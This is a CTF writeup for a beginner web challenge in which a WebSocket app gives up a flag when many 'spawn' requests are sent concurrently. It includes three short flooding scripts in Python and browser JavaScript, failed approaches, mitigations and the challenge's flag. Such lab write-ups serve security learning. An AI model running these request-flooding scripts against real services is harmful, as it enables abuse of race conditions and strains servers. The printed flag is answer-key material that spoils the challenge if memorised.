# Waguri 1 - CTF Writeup

## Challenge Information

**Category:** Web  
**Difficulty:** Beginner  
**Description:** The SPAWN button looks harmless, but there's something behind it. Can you find it out?  
**Flag Format:** `LYKNCTF{...}`

## Initial Reconnaissance

### 1. Landing Page Analysis

The challenge presents a web application with a simple interface:
- A large "SPAWN" button in the center
- Dark themed UI with gradient background
- Title: "Spawn Race"

```bash
curl -s http://[instance].nip.io:8080/
```

**Key observations:**
- Single page application
- WebSocket connection established on page load
- Button disabled until WebSocket connects
- Clicking button sends `{"type": "spawn"}` message via WebSocket

### 2. WebSocket Communication

The application uses WebSocket for real-time communication:

```javascript
const socket = new WebSocket(`${protocol}//${window.location.host}`);

spawnButton.addEventListener('click', () => {
    if (socket.readyState !== WebSocket.OPEN) {
        return;
    }
    socket.send(JSON.stringify({ type: 'spawn' }));
});
```

**Server Response Format:**
```json
{
  "type": "spawned",
  "image": "/images/1.gif",
  "sound": "/sounds/X.mp3",
  "spawnId": N
}
```

### 3. Available Resources

**Images:**
- `/images/1.gif` - 200x200 animated GIF (10 frames)

**Sounds:**
- `/sounds/1.mp3` through `/sounds/10.mp3` - Various audio files

## Vulnerability Analysis

### The Race Condition

The hint "there's something behind it" refers to a **race condition vulnerability** in the WebSocket message handling.

**Vulnerability:** When multiple spawn requests are sent rapidly without waiting for responses (fire-and-forget pattern), the server processes them concurrently. One of these concurrent requests can "win the race" and return a special response containing the flag.

### Why This Works

1. **Single Connection, Multiple Requests:** The WebSocket protocol allows sending multiple messages without waiting for responses
2. **Server-Side Concurrency:** The server processes each spawn request independently
3. **Race Window:** When requests arrive in quick succession, there's a small window where concurrent processing can trigger a special code path
4. **Flag Response:** The winning request receives additional fields: `"race":"won"` and `"flag":"LYKNCTF{...}"`

## Exploitation

### Method 1: Python WebSocket Client (Recommended)

```python
import websocket
import json

# Connect to WebSocket
ws = websocket.WebSocket()
ws.connect('ws://[instance].nip.io:8080/')

# Send 50 spawn messages rapidly without waiting for responses
for i in range(50):
    ws.send(json.dumps({'type': 'spawn'}))

# Read all responses
for i in range(50):
    response = ws.recv()
    data = json.loads(response)
    
    # Check for flag in response
    if 'flag' in data:
        print(f"FLAG FOUND: {data['flag']}")
        print(f"Full response: {json.dumps(data, indent=2)}")
        break

ws.close()
```

### Method 2: Concurrent Connections

```python
import websocket
import json
import threading

results = []

def spawn_worker():
    ws = websocket.WebSocket()
    ws.connect('ws://[instance].nip.io:8080/')
    ws.send(json.dumps({'type': 'spawn'}))
    response = ws.recv()
    results.append(json.loads(response))
    ws.close()

# Create 100 concurrent connections
threads = []
for i in range(100):
    t = threading.Thread(target=spawn_worker)
    threads.append(t)
    t.start()

for t in threads:
    t.join()

# Check for flag
for result in results:
    if 'flag' in result:
        print(f"FLAG: {result['flag']}")
        break
```

### Method 3: Browser Console

```javascript
// Open browser console on the challenge page
const socket = new WebSocket(`ws://${window.location.host}`);

socket.addEventListener('open', () => {
    // Send 50 messages rapidly
    for (let i = 0; i < 50; i++) {
        socket.send(JSON.stringify({ type: 'spawn' }));
    }
});

socket.addEventListener('message', (event) => {
    const data = JSON.parse(event.data);
    if (data.flag) {
        console.log('FLAG FOUND:', data.flag);
        alert('Flag: ' + data.flag);
    }
});
```

## Successful Exploitation

### Normal Response
```json
{
  "type": "spawned",
  "image": "/images/1.gif",
  "sound": "/sounds/7.mp3",
  "spawnId": 1
}
```

### Winning Response (with flag)
```json
{
  "type": "spawned",
  "image": "/images/1.gif",
  "sound": "/sounds/7.mp3",
  "spawnId": 6,
  "race": "won",
  "flag": "LYKNCTF{f3d4b9163035412cac167209455dd2b1}"
}
```

## Flag

```
LYKNCTF{f3d4b9163035412cac167209455dd2b1}
```

## Tools Used

1. **curl** - Initial reconnaissance and HTTP requests
2. **Python 3** - Exploitation scripts
3. **websocket-client** - Python WebSocket library
4. **Browser Developer Tools** - Network inspection and JavaScript console
5. **exiftool** - Metadata analysis of images and audio files
6. **binwalk** - Binary analysis of GIF file
7. **steghide** - Steganography analysis (ruled out)

## What Didn't Work

### 1. Steganography Analysis
- Checked GIF frames for hidden data
- Analyzed audio files for hidden messages
- LSB steganography extraction
- Metadata inspection
- **Result:** No hidden data found

### 2. Hidden DOM Elements
- Inspected page source for hidden elements
- Checked for CSS-hidden content
- Analyzed z-index layering
- **Result:** No hidden elements behind the button

### 3. Path Traversal
- Tried `/flag`, `/secret`, `/admin`, etc.
- Attempted directory traversal
- **Result:** All paths return 404

### 4. WebSocket Message Manipulation
- Tried different message types
- Added extra fields to spawn message
- **Result:** Server only accepts `{"type": "spawn"}`

### 5. Single Connection Sequential Requests
- Sending spawn messages one at a time
- Waiting for each response
- **Result:** Never triggers the race condition

## Key Learnings

1. **Race Conditions in WebSockets:** WebSocket connections can send multiple messages without waiting for responses, creating opportunities for race conditions
2. **Fire-and-Forget Pattern:** Sending requests without waiting for responses can trigger concurrent processing on the server
3. **Hint Interpretation:** "Something behind it" referred to the race condition vulnerability, not a literal hidden element
4. **Server-Side Validation:** The vulnerability exists in how the server handles concurrent requests, not in client-side validation

## Mitigation

To prevent this type of vulnerability:

1. **Implement Rate Limiting:** Limit the number of spawn requests per connection
2. **Use Message Queues:** Process WebSocket messages sequentially
3. **Add Request IDs:** Track and validate each request individually
4. **Server-Side Locks:** Use locks to prevent concurrent processing of related requests
5. **Validate Request Timing:** Reject requests that arrive too quickly

## Conclusion

This challenge demonstrates a classic race condition vulnerability in WebSocket-based applications. The key insight was recognizing that sending multiple requests without waiting for responses could trigger concurrent processing on the server, leading to a special code path that reveals the flag.

The vulnerability is particularly interesting because:
- It's not visible in the client-side code
- It requires understanding WebSocket protocol behavior
- It demonstrates how concurrent processing can lead to unexpected behavior
- The hint was metaphorical, not literal

**Difficulty Assessment:** Beginner-friendly once you understand race conditions, but requires thinking beyond obvious approaches like steganography or hidden elements.
